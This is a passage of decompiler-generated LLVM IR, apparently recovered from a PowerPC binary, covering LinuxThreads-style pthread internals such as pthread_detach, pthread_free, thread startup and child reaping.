  uselistorder label %dec_label_pc_100157e0, { 1, 0 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %v0_10015944 = call i32 @__pthread_do_exit()
  ret i32 %v0_10015944
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10015950 = load i32, i32* @r2, align 4
  store i32 %v0_10015950, i32* @r4, align 4
  store i32 268523880, i32* @lr, align 4
  %v0_10015964 = call i32 @__pthread_lock()
  %v1_10015968 = add i32 %arg1, 8
  %v2_10015968 = inttoptr i32 %v1_10015968 to i32*
  %v3_10015968 = load i32, i32* %v2_10015968, align 4
  store i32 %arg1, i32* @r3, align 4
  %v1_10015974 = add i32 %v3_10015968, 56
  %v2_10015974 = inttoptr i32 %v1_10015974 to i32*
  %v3_10015974 = load i32, i32* %v2_10015974, align 4
  store i32 %v3_10015974, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_10015974, align 4
  %v0_1001597c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001597c = icmp ne i32 %v0_1001597c, 0
  %v5_10015980 = zext i1 %v2_1001597c to i32
  store i32 268523912, i32* @lr, align 4
  %v0_10015984 = call i32 @__pthread_unlock()
  ret i32 %v5_10015980

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  %v1_100159bc = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_100159c0 = add i32 %v1_100159bc, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_100159c0, i32* @r3, align 4
  store i32 268523984, i32* @lr, align 4
  %v0_100159cc = call i32 @__pthread_lock()
  %v0_100159d0 = load i32, i32* @r31, align 4
  %v1_100159d0 = add i32 %v0_100159d0, 8
  %v2_100159d0 = inttoptr i32 %v1_100159d0 to i32*
  %v3_100159d0 = load i32, i32* %v2_100159d0, align 4
  %v3_100159d4 = icmp eq i32 %v3_100159d0, 0
  br i1 %v3_100159d4, label %dec_label_pc_100159e8, label %dec_label_pc_100159dc

dec_label_pc_100159dc:                            ; preds = %entry
  %v1_100159dc = add i32 %v3_100159d0, 16
  %v2_100159dc = inttoptr i32 %v1_100159dc to i32*
  %v3_100159dc = load i32, i32* %v2_100159dc, align 4
  %v0_100159e0 = load i32, i32* @r30, align 4
  %v4_100159e0 = icmp eq i32 %v0_100159e0, %v3_100159dc
  br i1 %v4_100159e0, label %dec_label_pc_100159f8, label %dec_label_pc_100159e8

dec_label_pc_100159e8:                            ; preds = %dec_label_pc_100159dc, %entry
  store i32 %v0_100159d0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100159f0.1054 to i32), i32* @lr, align 4
  %v0_100159ec = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a98

dec_label_pc_100159f8:                            ; preds = %dec_label_pc_100159dc
  %v1_100159f8 = add i32 %v3_100159d0, 45
  %v2_100159f8 = inttoptr i32 %v1_100159f8 to i8*
  %v3_100159f8 = load i8, i8* %v2_100159f8, align 1
  %v3_100159fc = icmp eq i8 %v3_100159f8, 0
  br i1 %v3_100159fc, label %dec_label_pc_10015a14, label %dec_label_pc_10015a04

dec_label_pc_10015a04:                            ; preds = %dec_label_pc_100159f8
  store i32 %v0_100159d0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015a0c.1055 to i32), i32* @lr, align 4
  %v0_10015a08 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a98

dec_label_pc_10015a14:                            ; preds = %dec_label_pc_100159f8
  %v1_10015a14 = add i32 %v3_100159d0, 56
  %v2_10015a14 = inttoptr i32 %v1_10015a14 to i32*
  %v3_10015a14 = load i32, i32* %v2_10015a14, align 4
  %v3_10015a18 = icmp eq i32 %v3_10015a14, 0
  br i1 %v3_10015a18, label %dec_label_pc_10015a2c, label %dec_label_pc_10015a20

dec_label_pc_10015a20:                            ; preds = %dec_label_pc_10015a14
  store i32 %v0_100159d0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10015a28.1056 to i32), i32* @lr, align 4
  %v0_10015a24 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015a94

dec_label_pc_10015a2c:                            ; preds = %dec_label_pc_10015a14
  %v1_10015a30 = add i32 %v3_100159d0, 44
  %v2_10015a30 = inttoptr i32 %v1_10015a30 to i8*
  %v3_10015a30 = load i8, i8* %v2_10015a30, align 1
  %v4_10015a30 = zext i8 %v3_10015a30 to i32
  store i32 %v4_10015a30, i32* %r29.global-to-local, align 4
  store i8 1, i8* %v2_100159f8, align 1
  %v0_10015a38 = load i32, i32* @r31, align 4
  store i32 %v0_10015a38, i32* @r3, align 4
  store i32 268524096, i32* @lr, align 4
  %v0_10015a3c = call i32 @__pthread_unlock()
  %v0_10015a40 = load i32, i32* %r29.global-to-local, align 4
  %v3_10015a40 = icmp eq i32 %v0_10015a40, 0
  br i1 %v3_10015a40, label %dec_label_pc_10015a94, label %dec_label_pc_10015a48

dec_label_pc_10015a48:                            ; preds = %dec_label_pc_10015a2c
  %v3_10015a4c = load i32, i32* @global_var_100450e4.985, align 4
  %v1_10015a50 = icmp slt i32 %v3_10015a4c, 0
  br i1 %v1_10015a50, label %dec_label_pc_10015a94, label %dec_label_pc_10015a58

dec_label_pc_10015a58:                            ; preds = %dec_label_pc_10015a48
  %v0_10015a64 = load i32, i32* @r2, align 4
  store i32 %v0_10015a64, i32* %stack_var_-184, align 4
  %v2_10015a6c = ptrtoint i32* %stack_var_-184 to i32
  store i32 268524156, i32* @lr, align 4
  %v2_10015a788 = call i32 @__libc_write(i32 %v3_10015a4c, i32 %v2_10015a6c)
  %v3_10015a7c11 = icmp eq i32 %v2_10015a788, -1
  br i1 %v3_10015a7c11, label %dec_label_pc_10015a84, label %dec_label_pc_10015a94

dec_label_pc_10015a84:                            ; preds = %dec_label_pc_10015a58, %dec_label_pc_10015a84.dec_label_pc_10015a68_crit_edge
  %v0_10015a84 = call i32 @__errno_location()
  %v1_10015a88 = inttoptr i32 %v0_10015a84 to i32*
  %v2_10015a88 = load i32, i32* %v1_10015a88, align 4
  %v3_10015a8c = icmp eq i32 %v2_10015a88, 4
  br i1 %v3_10015a8c, label %dec_label_pc_10015a84.dec_label_pc_10015a68_crit_edge, label %dec_label_pc_10015a94

dec_label_pc_10015a84.dec_label_pc_10015a68_crit_edge: ; preds = %dec_label_pc_10015a84
  %v3_10015a70.pre = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268524156, i32* @lr, align 4
  %v2_10015a78 = call i32 @__libc_write(i32 %v3_10015a70.pre, i32 %v2_10015a6c)
  %v3_10015a7c = icmp eq i32 %v2_10015a78, -1
  br i1 %v3_10015a7c, label %dec_label_pc_10015a84, label %dec_label_pc_10015a94

dec_label_pc_10015a94:                            ; preds = %dec_label_pc_10015a58, %dec_label_pc_10015a84, %dec_label_pc_10015a84.dec_label_pc_10015a68_crit_edge, %dec_label_pc_10015a48, %dec_label_pc_10015a2c, %dec_label_pc_10015a20
  br label %dec_label_pc_10015a98

dec_label_pc_10015a98:                            ; preds = %dec_label_pc_10015a04, %dec_label_pc_100159e8, %dec_label_pc_10015a94
  %v0_10015aa8 = phi i32 [ 22, %dec_label_pc_10015a04 ], [ 3, %dec_label_pc_100159e8 ], [ 0, %dec_label_pc_10015a94 ]
  ret i32 %v0_10015aa8

; uselistorder directives
  uselistorder i32 %v2_10015a6c, { 1, 0 }
  uselistorder i32 %v0_100159d0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 268524156, { 1, 0 }
  uselistorder label %dec_label_pc_10015a98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015a94, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_10015a84, { 1, 0 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10015ab8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10015ab8, i32* %r29.global-to-local, align 4
  %v2_10015ac4 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-40)
  %v3_10015ad0 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-40, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_10045148.998 to i32*), align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_10015ae84 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10015ae84, label %dec_label_pc_10015afc, label %dec_label_pc_10015ae0

dec_label_pc_10015ae0:                            ; preds = %entry, %dec_label_pc_10015ae0
  %v1_10015af07.in = phi i32 [ %storemerge, %dec_label_pc_10015ae0 ], [ %storemerge1, %entry ]
  %v1_10015af07 = add i32 %v1_10015af07.in, 56
  %v3_10015ae0 = call i32 @pthread_mutex_init(i32 %v1_10015af07, i32* nonnull %stack_var_-40)
  %v0_10015ae4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10015ae4 = add i32 %v0_10015ae4, 32
  %v2_10015ae4 = inttoptr i32 %v1_10015ae4 to i32*
  %storemerge = load i32, i32* %v2_10015ae4, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10015ae8 = icmp eq i32 %storemerge, 0
  br i1 %v3_10015ae8, label %dec_label_pc_10015afc, label %dec_label_pc_10015ae0

dec_label_pc_10015afc:                            ; preds = %dec_label_pc_10015ae0, %entry
  %v1_10015b00 = call i32 @pthread_mutexattr_destroy(i32 %v2_10015ab8)
  ret i32 %v1_10015b00

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015ae0, { 1, 0 }
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r31, align 4
  %v3_10015b34 = load i32, i32* @global_var_10040ad8.1057, align 4
  %v3_10015b38 = icmp slt i32 %v3_10015b34, %arg1
  br i1 %v3_10015b38, label %dec_label_pc_10015b40, label %dec_label_pc_10015b74

dec_label_pc_10015b40:                            ; preds = %entry
  store i32 268524356, i32* @lr, align 4
  %v1_10015b40 = call i32 @sched_get_priority_max(i32 1)
  %v0_10015b58 = call i32 @__asm_mfcr()
  %v1_10015b5c = call i32 @__asm_rlwinm(i32 %v0_10015b58, i32 29, i32 31, i32 31)
  store i32 268524400, i32* @lr, align 4
  %v0_10015b6c = call i32 @sched_setscheduler()
  %v0_10015b70 = load i32, i32* @r31, align 4
  store i32 %v0_10015b70, i32* @global_var_10040ad8.1057, align 4
  br label %dec_label_pc_10015b74

dec_label_pc_10015b74:                            ; preds = %entry, %dec_label_pc_10015b40
  %v0_10015b84 = phi i32 [ 1, %entry ], [ %v0_10015b6c, %dec_label_pc_10015b40 ]
  ret i32 %v0_10015b84

; uselistorder directives
  uselistorder label %dec_label_pc_10015b74, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %v3_10015b98 = load i32, i32* @global_var_10045200.1058, align 4
  %v3_10015ba0 = icmp eq i32 %v3_10015b98, 0
  br i1 %v3_10015ba0, label %dec_label_pc_10015ba8, label %dec_label_pc_10015bbc

dec_label_pc_10015ba8:                            ; preds = %entry
  br label %dec_label_pc_10015bbc

dec_label_pc_10015bbc:                            ; preds = %entry, %dec_label_pc_10015ba8
  %v0_10015bbc = phi i1 [ false, %dec_label_pc_10015ba8 ], [ true, %entry ]
  store i32 1, i32* @global_var_10045200.1058, align 4
  br i1 %v0_10015bbc, label %dec_label_pc_10015bbc.dec_label_pc_10015c0c_crit_edge, label %dec_label_pc_10015bd0

dec_label_pc_10015bbc.dec_label_pc_10015c0c_crit_edge: ; preds = %dec_label_pc_10015bbc
  %v0_10015c18.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10015c0c

dec_label_pc_10015bd0:                            ; preds = %dec_label_pc_10015bbc
  store i32 0, i32* %stack_var_-168, align 4
  %v2_10015be4 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10015be0

dec_label_pc_10015be0:                            ; preds = %dec_label_pc_10015bfc, %dec_label_pc_10015bd0
  %v3_10015be8 = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268524532, i32* @lr, align 4
  %v2_10015bf0 = call i32 @__libc_write(i32 %v3_10015be8, i32 %v2_10015be4)
  %v3_10015bf4 = icmp eq i32 %v2_10015bf0, -1
  br i1 %v3_10015bf4, label %dec_label_pc_10015bfc, label %dec_label_pc_10015c0c

dec_label_pc_10015bfc:                            ; preds = %dec_label_pc_10015be0
  %v0_10015bfc = call i32 @__errno_location()
  %v1_10015c00 = inttoptr i32 %v0_10015bfc to i32*
  %v2_10015c00 = load i32, i32* %v1_10015c00, align 4
  %v3_10015c04 = icmp eq i32 %v2_10015c00, 4
  br i1 %v3_10015c04, label %dec_label_pc_10015be0, label %dec_label_pc_10015c0c

dec_label_pc_10015c0c:                            ; preds = %dec_label_pc_10015be0, %dec_label_pc_10015bfc, %dec_label_pc_10015bbc.dec_label_pc_10015c0c_crit_edge
  %v0_10015c18 = phi i32 [ %v0_10015c18.pre, %dec_label_pc_10015bbc.dec_label_pc_10015c0c_crit_edge ], [ %v2_10015bf0, %dec_label_pc_10015be0 ], [ %v0_10015bfc, %dec_label_pc_10015bfc ]
  ret i32 %v0_10015c18

; uselistorder directives
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder label %dec_label_pc_10015c0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015bbc, { 1, 0 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10015c64:
  %v3_10015c64 = icmp eq i32 %arg2, 0
  br i1 %v3_10015c64, label %dec_label_pc_10015c74, label %dec_label_pc_10015c6c

dec_label_pc_10015c6c:                            ; preds = %dec_label_pc_10015c64
  %v3_10015c38 = load i32, i32* @global_var_100450e0, align 4
  %v1_10015c6c = add i32 %v3_10015c38, 20
  %v2_10015c6c = inttoptr i32 %v1_10015c6c to i32*
  %v3_10015c6c = load i32, i32* %v2_10015c6c, align 4
  store i32 268524660, i32* @lr, align 4
  %v2_10015c70 = call i32 @kill(i32 %v3_10015c6c, i32 %arg1)
  br label %dec_label_pc_10015c74

dec_label_pc_10015c74:                            ; preds = %dec_label_pc_10015c64, %dec_label_pc_10015c6c
  %v0_10015c84 = phi i32 [ %arg1, %dec_label_pc_10015c64 ], [ %v2_10015c70, %dec_label_pc_10015c6c ]
  ret i32 %v0_10015c84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10015c74, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268524708, i32* @lr, align 4
  %v0_10015ca0 = call i32 @__libc_getpid()
  %v1_10015ca4 = load i32, i32* @r31, align 4
  %v2_10015ca4 = add i32 %v1_10015ca4, 20
  %v3_10015ca4 = inttoptr i32 %v2_10015ca4 to i32*
  store i32 %v0_10015ca0, i32* %v3_10015ca4, align 4
  %v0_10015ca8 = load i32, i32* @r31, align 4
  %v1_10015ca8 = add i32 %v0_10015ca8, 100
  store i32 268524728, i32* @lr, align 4
  %v3_10015cb4 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10015ca8, i32 0)
  %v0_10015cb8 = load i32, i32* @r31, align 4
  %v1_10015cb8 = add i32 %v0_10015cb8, 228
  %v2_10015cb8 = inttoptr i32 %v1_10015cb8 to i32*
  %v3_10015cb8 = load i32, i32* %v2_10015cb8, align 4
  %v1_10015cbc = icmp slt i32 %v3_10015cb8, 0
  br i1 %v1_10015cbc, label %dec_label_pc_10015cd0, label %dec_label_pc_10015cc4

dec_label_pc_10015cc4:                            ; preds = %entry
  br label %dec_label_pc_10015cf4

dec_label_pc_10015cd0:                            ; preds = %entry
  %v3_10015cd4 = load i32, i32* @global_var_10040ad8.1057, align 4
  %tmp7 = icmp slt i32 %v3_10015cd4, 1
  br i1 %tmp7, label %dec_label_pc_10015cf8, label %dec_label_pc_10015ce0

dec_label_pc_10015ce0:                            ; preds = %dec_label_pc_10015cd0
  br label %dec_label_pc_10015cf4

dec_label_pc_10015cf4:                            ; preds = %dec_label_pc_10015cc4, %dec_label_pc_10015ce0
  store i32 268524792, i32* @lr, align 4
  %v0_10015cf4 = call i32 @sched_setscheduler()
  br label %dec_label_pc_10015cf8

dec_label_pc_10015cf8:                            ; preds = %dec_label_pc_10015cd0, %dec_label_pc_10015cf4
  %v3_10015cfc = load i32, i32* @global_var_1004521c.1021, align 4
  %v3_10015d00 = icmp eq i32 %v3_10015cfc, 0
  br i1 %v3_10015d00, label %dec_label_pc_10015d58, label %dec_label_pc_10015d08

dec_label_pc_10015d08:                            ; preds = %dec_label_pc_10015cf8
  %v3_10015d0c = load i32, i32* @global_var_1004510c.995, align 4
  %tmp8 = icmp slt i32 %v3_10015d0c, 1
  br i1 %tmp8, label %dec_label_pc_10015d58, label %dec_label_pc_10015d18

dec_label_pc_10015d18:                            ; preds = %dec_label_pc_10015d08
  %v0_10015d1c = load i32, i32* @r31, align 4
  store i32 %v0_10015d1c, i32* %stack_var_-164, align 4
  %v2_10015d28 = ptrtoint i32* %stack_var_-164 to i32
  br label %dec_label_pc_10015d24

dec_label_pc_10015d24:                            ; preds = %dec_label_pc_10015d40, %dec_label_pc_10015d18
  %v3_10015d2c = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268524856, i32* @lr, align 4
  %v2_10015d34 = call i32 @__libc_write(i32 %v3_10015d2c, i32 %v2_10015d28)
  %v3_10015d38 = icmp eq i32 %v2_10015d34, -1
  br i1 %v3_10015d38, label %dec_label_pc_10015d40, label %dec_label_pc_10015d50

dec_label_pc_10015d40:                            ; preds = %dec_label_pc_10015d24
  %v0_10015d40 = call i32 @__errno_location()
  %v1_10015d44 = inttoptr i32 %v0_10015d40 to i32*
  %v2_10015d44 = load i32, i32* %v1_10015d44, align 4
  %v3_10015d48 = icmp eq i32 %v2_10015d44, 4
  br i1 %v3_10015d48, label %dec_label_pc_10015d24, label %dec_label_pc_10015d50

dec_label_pc_10015d50:                            ; preds = %dec_label_pc_10015d24, %dec_label_pc_10015d40
  %v0_10015d50 = load i32, i32* @r31, align 4
  store i32 %v0_10015d50, i32* @r3, align 4
  store i32 268524888, i32* @lr, align 4
  %v0_10015d54 = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_10015d58

dec_label_pc_10015d58:                            ; preds = %dec_label_pc_10015d08, %dec_label_pc_10015cf8, %dec_label_pc_10015d50
  %v0_10015d58 = load i32, i32* @r31, align 4
  %v1_10015d5c = add i32 %v0_10015d58, 92
  %v2_10015d5c = inttoptr i32 %v1_10015d5c to i32*
  %v3_10015d5c = load i32, i32* %v2_10015d5c, align 4
  call void @__pseudo_call(i32 %v3_10015d5c)
  %v0_10015d6c = call i32 @__pthread_do_exit()
  ret i32 %v0_10015d6c

; uselistorder directives
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @sched_setscheduler, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10015d58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015d50, { 1, 0 }
  uselistorder label %dec_label_pc_10015cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10015cf4, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268524940, i32* @lr, align 4
  %v0_10015d88 = call i32 @__libc_getpid()
  %v1_10015d8c = load i32, i32* @r29, align 4
  %v2_10015d8c = add i32 %v1_10015d8c, 20
  %v3_10015d8c = inttoptr i32 %v2_10015d8c to i32*
  store i32 %v0_10015d88, i32* %v3_10015d8c, align 4
  store i32 0, i32* @r4, align 4
  %v0_10015d94 = load i32, i32* @r29, align 4
  %v1_10015d94 = add i32 %v0_10015d94, 28
  %v2_10015d94 = inttoptr i32 %v1_10015d94 to i32*
  %v3_10015d94 = load i32, i32* %v2_10015d94, align 4
  store i32 %v3_10015d94, i32* @r3, align 4
  store i32 268524956, i32* @lr, align 4
  %v0_10015d98 = call i32 @__pthread_lock()
  %v0_10015d9c = load i32, i32* @r29, align 4
  %v1_10015d9c = add i32 %v0_10015d9c, 28
  %v2_10015d9c = inttoptr i32 %v1_10015d9c to i32*
  %v3_10015d9c = load i32, i32* %v2_10015d9c, align 4
  store i32 %v3_10015d9c, i32* @r3, align 4
  store i32 268524964, i32* @lr, align 4
  %v0_10015da0 = call i32 @__pthread_unlock()
  %v0_10015da4 = load i32, i32* @r29, align 4
  %v1_10015da8 = call i32 @pthread_start_thread(i32 %v0_10015da4)
  ret i32 %v1_10015da8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v1_10015dcc = add i32 %arg1, 16
  %v2_10015dcc = inttoptr i32 %v1_10015dcc to i32*
  %v3_10015dcc = load i32, i32* %v2_10015dcc, align 4
  %v1_10015dd0 = call i32 @__asm_rlwinm(i32 %v3_10015dcc, i32 4, i32 18, i32 27)
  %v2_10015dd4 = add i32 %v1_10015dd0, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_10015dd4, i32* @r29, align 4
  store i32 %v2_10015dd4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10015de0.1060 to i32), i32* @lr, align 4
  %v0_10015ddc = call i32 @__pthread_lock()
  %v1_10015de4 = load i32, i32* @r29, align 4
  %v2_10015de4 = add i32 %v1_10015de4, 8
  %v3_10015de4 = inttoptr i32 %v2_10015de4 to i32*
  store i32 0, i32* %v3_10015de4, align 4
  %v1_10015dec = load i32, i32* @r29, align 4
  %v2_10015dec = add i32 %v1_10015dec, 12
  %v3_10015dec = inttoptr i32 %v2_10015dec to i32*
  store i32 -1, i32* %v3_10015dec, align 4
  %v0_10015df0 = load i32, i32* @r29, align 4
  store i32 %v0_10015df0, i32* @r3, align 4
  store i32 268525048, i32* @lr, align 4
  %v0_10015df4 = call i32 @__pthread_unlock()
  %v3_10015dfc = load i32, i32* @global_var_10045120.1061, align 4
  %v1_10015e00 = add i32 %v3_10015dfc, -1
  store i32 %v1_10015e00, i32* @global_var_10045120.1061, align 4
  %v0_10015e08 = load i32, i32* @r31, align 4
  %v1_10015e08 = add i32 %v0_10015e08, 448
  %v2_10015e08 = inttoptr i32 %v1_10015e08 to i32*
  %v3_10015e08 = load i32, i32* %v2_10015e08, align 4
  %v3_10015e187 = icmp eq i32 %v3_10015e08, 0
  store i32 %v3_10015e08, i32* @r3, align 4
  br i1 %v3_10015e187, label %dec_label_pc_10015e24, label %dec_label_pc_10015e10

dec_label_pc_10015e10:                            ; preds = %entry, %dec_label_pc_10015e10
  %v0_10015e10 = phi i32 [ %v0_10015e18.pr, %dec_label_pc_10015e10 ], [ %v3_10015e08, %entry ]
  %v1_10015e10 = inttoptr i32 %v0_10015e10 to i32*
  %v2_10015e10 = load i32, i32* %v1_10015e10, align 4
  store i32 %v2_10015e10, i32* @r29, align 4
  store i32 268525080, i32* @lr, align 4
  %v0_10015e14 = call i32 @free()
  %v0_10015e18.pr = load i32, i32* @r29, align 4
  %v3_10015e18 = icmp eq i32 %v0_10015e18.pr, 0
  store i32 %v0_10015e18.pr, i32* @r3, align 4
  br i1 %v3_10015e18, label %dec_label_pc_10015e18.dec_label_pc_10015e24_crit_edge, label %dec_label_pc_10015e10

dec_label_pc_10015e18.dec_label_pc_10015e24_crit_edge: ; preds = %dec_label_pc_10015e10
  %v0_10015e24.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e24

dec_label_pc_10015e24:                            ; preds = %dec_label_pc_10015e18.dec_label_pc_10015e24_crit_edge, %entry
  %v0_10015e24 = phi i32 [ %v0_10015e24.pre, %dec_label_pc_10015e18.dec_label_pc_10015e24_crit_edge ], [ %v0_10015e08, %entry ]
  %v1_10015e24 = add i32 %v0_10015e24, 452
  %v2_10015e24 = inttoptr i32 %v1_10015e24 to i32*
  %v3_10015e24 = load i32, i32* %v2_10015e24, align 4
  %v3_10015e343 = icmp eq i32 %v3_10015e24, 0
  store i32 %v3_10015e24, i32* @r3, align 4
  br i1 %v3_10015e343, label %dec_label_pc_10015e40, label %dec_label_pc_10015e2c

dec_label_pc_10015e2c:                            ; preds = %dec_label_pc_10015e24, %dec_label_pc_10015e2c
  %v0_10015e2c = phi i32 [ %v0_10015e34.pr, %dec_label_pc_10015e2c ], [ %v3_10015e24, %dec_label_pc_10015e24 ]
  %v1_10015e2c = inttoptr i32 %v0_10015e2c to i32*
  %v2_10015e2c = load i32, i32* %v1_10015e2c, align 4
  store i32 %v2_10015e2c, i32* @r29, align 4
  store i32 268525108, i32* @lr, align 4
  %v0_10015e30 = call i32 @free()
  %v0_10015e34.pr = load i32, i32* @r29, align 4
  %v3_10015e34 = icmp eq i32 %v0_10015e34.pr, 0
  store i32 %v0_10015e34.pr, i32* @r3, align 4
  br i1 %v3_10015e34, label %dec_label_pc_10015e34.dec_label_pc_10015e40_crit_edge, label %dec_label_pc_10015e2c

dec_label_pc_10015e34.dec_label_pc_10015e40_crit_edge: ; preds = %dec_label_pc_10015e2c
  %v0_10015e48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e40

dec_label_pc_10015e40:                            ; preds = %dec_label_pc_10015e34.dec_label_pc_10015e40_crit_edge, %dec_label_pc_10015e24
  %v0_10015e68 = phi i32 [ %v0_10015e48.pre, %dec_label_pc_10015e34.dec_label_pc_10015e40_crit_edge ], [ %v0_10015e24, %dec_label_pc_10015e24 ]
  %v4_10015e48 = icmp eq i32 %v0_10015e68, ptrtoint (i32* @global_var_100408e0 to i32)
  br i1 %v4_10015e48, label %dec_label_pc_10015e80, label %dec_label_pc_10015e50

dec_label_pc_10015e50:                            ; preds = %dec_label_pc_10015e40
  %v1_10015e50 = add i32 %v0_10015e68, 392
  %v2_10015e50 = inttoptr i32 %v1_10015e50 to i32*
  %v3_10015e50 = load i32, i32* %v2_10015e50, align 4
  %v3_10015e54 = icmp eq i32 %v3_10015e50, 0
  br i1 %v3_10015e54, label %dec_label_pc_10015e5c, label %dec_label_pc_10015e80

dec_label_pc_10015e5c:                            ; preds = %dec_label_pc_10015e50
  %v1_10015e5c = add i32 %v0_10015e68, 400
  %v2_10015e5c = inttoptr i32 %v1_10015e5c to i32*
  %v3_10015e5c = load i32, i32* %v2_10015e5c, align 4
  %v3_10015e60 = icmp eq i32 %v3_10015e5c, 0
  br i1 %v3_10015e60, label %dec_label_pc_10015e70, label %dec_label_pc_10015e68

dec_label_pc_10015e68:                            ; preds = %dec_label_pc_10015e5c
  %v1_10015e68 = add i32 %v0_10015e68, 396
  %v2_10015e68 = inttoptr i32 %v1_10015e68 to i32*
  %v3_10015e68 = load i32, i32* %v2_10015e68, align 4
  store i32 268525168, i32* @lr, align 4
  %v2_10015e6c = call i32 @munmap(i32 %v3_10015e68, i32 %v3_10015e5c)
  %v0_10015e70.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015e70

dec_label_pc_10015e70:                            ; preds = %dec_label_pc_10015e5c, %dec_label_pc_10015e68
  %v0_10015e70 = phi i32 [ %v0_10015e68, %dec_label_pc_10015e5c ], [ %v0_10015e70.pre, %dec_label_pc_10015e68 ]
  %v1_10015e78 = add i32 %v0_10015e70, -2096672
  store i32 268525184, i32* @lr, align 4
  %v2_10015e7c = call i32 @munmap(i32 %v1_10015e78, i32 2097152)
  br label %dec_label_pc_10015e80

dec_label_pc_10015e80:                            ; preds = %dec_label_pc_10015e50, %dec_label_pc_10015e40, %dec_label_pc_10015e70
  %v0_10015e90 = phi i32 [ 0, %dec_label_pc_10015e50 ], [ 0, %dec_label_pc_10015e40 ], [ %v2_10015e7c, %dec_label_pc_10015e70 ]
  ret i32 %v0_10015e90

; uselistorder directives
  uselistorder i32 %v0_10015e34.pr, { 1, 2, 0 }
  uselistorder i32 %v0_10015e18.pr, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100408e0 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10015e80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015e70, { 1, 0 }
  uselistorder label %dec_label_pc_10015e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10015e10, { 1, 0 }
}

define i32 @restart.4() local_unnamed_addr {
entry:
  store i32 268525220, i32* @lr, align 4
  %v0_10015ea0 = call i32 @__pthread_restart_new()
  ret i32 %v0_10015ea0
}

define i32 @pthread_reap_children(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10015fd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10015fd0, i32* @r4, align 4
  store i32 268525528, i32* @lr, align 4
  %v3_10015fd49 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10015fd0, i32 -2147483647)
